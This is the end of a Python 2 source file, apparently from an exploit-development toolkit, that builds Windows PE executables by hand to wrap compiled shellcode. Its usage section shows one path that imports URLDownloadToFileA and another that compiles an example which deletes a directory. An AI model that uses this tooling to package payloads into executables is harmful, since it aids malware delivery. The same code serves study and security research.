                #  Basically, we have a win32peresolver that pass some fixed address (that would be our PE PLT)
                # and thats returned to the compile code. The win32peresolver put all this address on a cached.
                # 
                # Concerning PE
                #  First of all, we need to compile before everything, cause we need the list of imported functions
                #  So, we send mosdef a hardcoded address(0x401A0) offset: 0x1A0 which is where the .text section start.
                #  At that address, will be our PLT (jmp *(IAT_entry)), so we have to point the Entry Address to 
                #  .code + function_number * sizeof(jmp *(IAT_entry)). So we land on the begging on the shellcode.
                #  
                #  To discover where the IAT would be (we need to know this, before creating the PLT), we need to calculate
                #  where the First thunk
                #
                #              buf+= secondpad
                #              buf+= data_buf   
                #              
                #              for a in imports:
                #                      buf+= a[0].raw()
                #              buf+= import_str
                #
                #              # ORIGINAL THUNK
                #             for a in IIBN:
                #                     for b in a: # Listing function
                #                              buf+=struct.pack("L",b[1]) 
                #                      buf+=struct.pack("L",0x0)
                #              # FIRST THUNK
                #              for a in IIBN:
                #                      for b in a: # Listing function
                #                              buf+=struct.pack("L",b[1]) 
                #                      buf+=struct.pack("L",0x0)
              
                # side note: .code must be aligned
                
                image_base = 0x40000
                plt_len = len(mosdef.assemble("jmp *(0x01020304)", "X86"))
                plt_entry = 0x1A0 + image_base
                
                w=win32peresolver(plt_entry)                
                w.setPLTEntrySize(plt_len)
                
                shellcode = w.compile(code, vars)
                
                # We need to pass the functioncache[func] = address into [ ("advapi32.dll", ["RevertToSelf"])] format
                # Yeah, probably you can do it better or with one fancy python line
                dll={}
                func_by_addr = {}
                functions_num=0

                
                for a in w.remotefunctioncache.keys():
                        s = a.split("|")
                        if dll.has_key( s[0] ):
                                dll[s[0] ].append(s[1])
                        else:
                                dll[ s[0] ] = [ s[1] ] 
                        functions_num+=1
                        func_by_addr[a] = w.remotefunctioncache[a]

                importante = []
                for a in dll.keys():
                        importante.append( (a, dll[a]) )
                shellcode = "\x90" * ( plt_len * functions_num) + shellcode

                # So, by now we have important in the fancy format [ ('dll name', ['functions'] ) ]
                # And also, func_by_addr = {dllname!function]: function_plt }, and also functions_num has the size of functions
                
                
                
                idx= 0
                # MZ
                mz = MZ()
                mz.e_lfanew = mz.getSize()
                
                idx+= mz.getSize()

                # PE Image Header
                imgHdr = IMGhdr()
                imgHdr.Machine = 0x014c         # i386
                imgHdr.NumberOfSections = 0x2   # Code and data for now (Maybe we can do it only one)
                imgHdr.Characteristics = 0x0102 # Executable on 32-bit machine
                
                idx += imgHdr.getSize() + 4 # for PE_MAGIC
                
                # Optional Header 
                imgOpt = IMGOPThdr()
                imgOpt.SectionAlignment = 0x20 # Thats our aligment
                imgOpt.FileAlignment    = 0x20
                imgOpt.MajorOperatingSystemVersion = 0x4 # NT4.0
                imgOpt.MajorSubsystemVersion = 0x4 # Win32 4.0
                imgOpt.Subsystem = 0x3
                imgOpt.SizeOfStackReserve = 0x100000
                imgOpt.SizeOfStackCommit  = 0x1000
                imgOpt.SizeOfHeapReserve  = 0x100000
                imgOpt.SizeOfHeapCommit   = 0x1000
                imgOpt.NumberOfRvaAndSizes= 0x10

                idx += imgOpt.getSize()
                
                # Directories
                directories=[]
                for a in range(0, imgOpt.NumberOfRvaAndSizes):
                        directories.append(Directory())

                idx+= directories[0].getSize() * 16

                # .code section
                code = Section()
                code.Name = ".text"
                code.Characteristics = 0x60000020L  # Code | Executable | Readable
                idx+= code.getSize()
                
                # .data section
                data = Section()
                data.Name = ".data"
                data.Characteristics = 0xc0000040L # Initialized | Readable | Writeable
                
                idx += data.getSize()
                
                code_offset = self.align(idx, imgOpt.FileAlignment)
                firstpad= "\0" * (code_offset - idx)
                idx=code_offset
                
                # we can fill data_buf with our data and that will be loaded into mem :>
                idx+= len(shellcode)
                data_offset = self.align(idx, imgOpt.FileAlignment)
                secondpad= "\0" * (data_offset - idx)
                idx = data_offset
                data_buf =""  
                idx+= len(data_buf)
                
                # Creating the list of ImportDescriptors
                import_offset =idx
                imports=[]
                ndx= 0
                import_str=""
                
                for a in importante:
                        i= ImportDescriptor()
                        i.ForwarderChain= 0xFFFFFFFFL
                        imports.append( (i,  ndx))

                        ndx+=len(a[0]+"\0") # We put on NDX, an index of the name string, so at the end
                                          #  to find a string, we will do import_str_offset + this_index

                        import_str += a[0] + "\0" # Collecting dll names

                # The final importdescriptor
                imports.append((ImportDescriptor(), 0))
                idx+= i.getSize() * len(imports)
                
                import_str_offset = idx
                idx+= len(import_str)
                                         
                off = self.align(idx, imgOpt.FileAlignment)
                import_str+="\0" * (off-idx)
                idx = off
                
                # Original Thunks
                original_thunks_offset = idx
                original_thunk=[]

                for a in importante:
                        original_thunk.append(idx)
                                
                        idx+= len(a[1]) * 4 + 4
                        
                # First thunk offset
                first_thunks_offset = idx
                first_thunk=[]
                plt_ndx = 0x1A0
                for a in importante:
                        first_thunk.append(idx)
                        for b in a[1]:
                                dupla = "%s|%s" % (a[0], b)

                                if not func_by_addr.has_key(dupla):
                                        raise PEError, "Error on Thunk"
                                func_by_addr[ func_by_addr[dupla] ] = "jmp *(0x%08x)\n" % (idx+ image_base)
                                idx+=4
                        idx+= 4
                # crafting a PLT
                PLT=""
                for a in range(plt_entry, plt_entry+ plt_len* functions_num, plt_len):
                        if not func_by_addr.has_key(a):
                                raise PEError, "func_by_addr doesn't have a PLT address (%x)" % a
                        PLT+= mosdef.assemble(func_by_addr[a], "X86")
                shellcode = PLT + shellcode[plt_len* functions_num:]
                print "Shellcode size (with PLT): %d" % len(shellcode)

                                                                        
                # Creating IIBN 
                IIBN=[]
                for a in importante: 
                        tbl=[]
                        IIBN.append(tbl)
                        for b in a[1]:
                                iibn = ImageImportByName()
                                iibn.Name = b #"RevertToSelf"
                                iibn.Hint = 1
                                tbl.append((iibn, idx)) 
                                idx+=iibn.getSize()                
                                
                endpad= "\0" * (self.align(idx, imgOpt.FileAlignment) - idx)   
                
                # Filling the gaps
                imgOpt.SizeOfCode = len(shellcode) + len(secondpad)
                imgOpt.BaseOfCode = code_offset
                # Entry point = code_offset + PLT_entry size
                imgOpt.AddressOfEntryPoint = code_offset + plt_len * functions_num
                
                imgOpt.BaseOfData = data_offset
                imgOpt.ImageBase = image_base
                imgOpt.SizeOfInitializedData = 0x20
                imgOpt.SizeOfImage = 0xC # 
                
                imgOpt.SizeOfHeaders = code_offset
                imgOpt.NumberOfRvaAndSizes = 0x10
                
                # Import Directory

                directories[1].VirtualSize=directories[1].Size = idx - import_offset 
                directories[1].VirtualAddress= import_offset 
                
                # code and data
                code.VirtualAddress = code_offset
                code.VirtualSize= code.SizeOfRawData  = imgOpt.SizeOfCode 
                code.PointerToRawData = code_offset
                
                data.VirtualAddress = data_offset
                data.VirtualSize = data.SizeOfRawData = idx - data_offset #len(data_buf)
                data.PointerToRawData  = data_offset

                imgOpt.SizeOfImage =  idx #

                # Fixing imports with thunk info
                for a in range(0, len(imports)-1):
                        imports[a][0].OriginalFirstThunk= original_thunk[a]
                        imports[a][0].FirstThunk= first_thunk[a] 
                        imports[a][0].Name = import_str_offset + imports[a][1]                        
                        
                
                # RAWing...
                buf = mz.raw() + struct.pack("L", PE_MAGIC) +imgHdr.raw() + imgOpt.raw()
                for a in directories:
                        buf+= a.raw()
                buf+= code.raw()
                buf+= data.raw()
                buf+= firstpad
                buf+= shellcode
                buf+= secondpad
                buf+= data_buf   
                
                for a in imports:
                        buf+= a[0].raw()
                buf+= import_str

                # ORIGINAL THUNK
                for a in IIBN:
                        for b in a: # Listing function
                                buf+=struct.pack("L",b[1]) 
                        buf+=struct.pack("L",0x0)

                # FIRST THUNK
                for a in IIBN:
                        for b in a: # Listing function
                                buf+=struct.pack("L",b[1]) 
                        buf+=struct.pack("L",0x0)
                        
                # IIBN
                for a in IIBN:
                        for b in a:
                                buf+= b[0].raw()
                buf+= endpad
                
                # Done, dumping to a file
                f=open(filename, "wb")
                f.write(buf)
                f.close()
                return len(buf)

def usage(name):
        print "usage: %s -f <file> [-O -W]" % name
        print "\t -O inspect the file given by -f"
        print "\t -W create a .exe using createShellcode"
        print "\t -E create a .exe using MOSDEF code"
        sys.exit(0)

if __name__ == "__main__":
        import getopt, sys
        args= sys.argv[1:]
        OPEN  = 0x1
        WRITE = 0x2
        EXAMPLE = 0x3
        p=PElib()
        
        what=0
        file=""
        try:
                opts, args = getopt.getopt(args, "f:OWE")
        except:
                print "Error in Arguments"
                usage(sys.argv[0])
        for o,a in opts:
                if o == '-f':
                        file=a
                if o == '-O':
                        what =OPEN
                if o == '-W':
                        what = WRITE
                if o == '-E':
                        what = EXAMPLE
        if file:
                if what == OPEN:
                        p.openfile(file)
                elif what == WRITE:
                        shellcode=p.createShellcode()
                        imports = [ ("advapi32.dll", ["RevertToSelf", "AccessCheck"]), ("urlmon.dll", ["URLDownloadToFileA", "FindMediaType" ]) ] 

                        p.createPE(file, shellcode, imports)
                        
                elif what == EXAMPLE:
                        vars={}
                        vars["filename"]="boo"

                        code="""      
                        //start of code
                        #import "remote", "kernel32.dll|GetProcAddress" as "getprocaddress"
                        #import "remote", "kernel32.dll|RemoveDirectoryA" as "RemoveDirectory"
                        #import "remote", "kernel32.dll|ExitProcess" as "exit"
                        #import "string", "filename" as "filename"

                        void main() 
                        {
                        int i;
                        i = RemoveDirectory(filename);
                        i = exit(0);
                        }
                        """


                        p.createMOSDEFPE(file, code, vars)
                        
                else:
                        usage(sys.argv[0])
        else:

                usage(sys.argv[0])
                

                #self._openPE()
